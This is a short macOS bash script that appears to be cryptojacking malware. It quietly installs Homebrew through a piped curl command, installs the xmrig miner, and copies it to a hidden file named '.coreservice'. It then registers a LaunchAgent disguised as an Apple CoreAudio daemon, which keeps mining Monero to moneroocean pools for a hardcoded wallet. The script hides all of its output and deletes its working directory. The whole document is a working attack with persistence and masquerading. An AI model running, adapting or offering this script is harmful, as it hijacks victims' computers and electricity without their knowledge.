#!/bin/bash
set -e

cd "$(mktemp -d)"
f="com.apple.coreaudio.daemon.plist"
b="$HOME/.config/.coreservice"

/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" >/dev/null 2>&1
eval "$(/opt/homebrew/bin/brew shellenv)" >/dev/null 2>&1
/opt/homebrew/bin/brew install --quiet xmrig >/dev/null 2>&1

mkdir -p "$(dirname "$b")"
cp /opt/homebrew/bin/xmrig "$b"
chmod +x "$b"

cat <<EOF > "$f"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.coreaudio.daemon</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>while true; do if ! pgrep -f ".coreservice"; then "$b" -o gulf.moneroocean.stream:10128 -o pool.moneroocean.stream:443 -u 48Pv4WVhS3g4tjvsZqB3NVD9JL8hC5kVbXjvTmF5UQ5i7sS9rL3pD2qE6fA1bC9nK8mX4gH7jV5pT3 --tls -t 3 --background-task; fi; sleep 60; done</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF

mkdir -p ~/Library/LaunchAgents
mv "$f" ~/Library/LaunchAgents/
launchctl load ~/Library/LaunchAgents/"$f" >/dev/null 2>&1
rm -rf "$PWD"
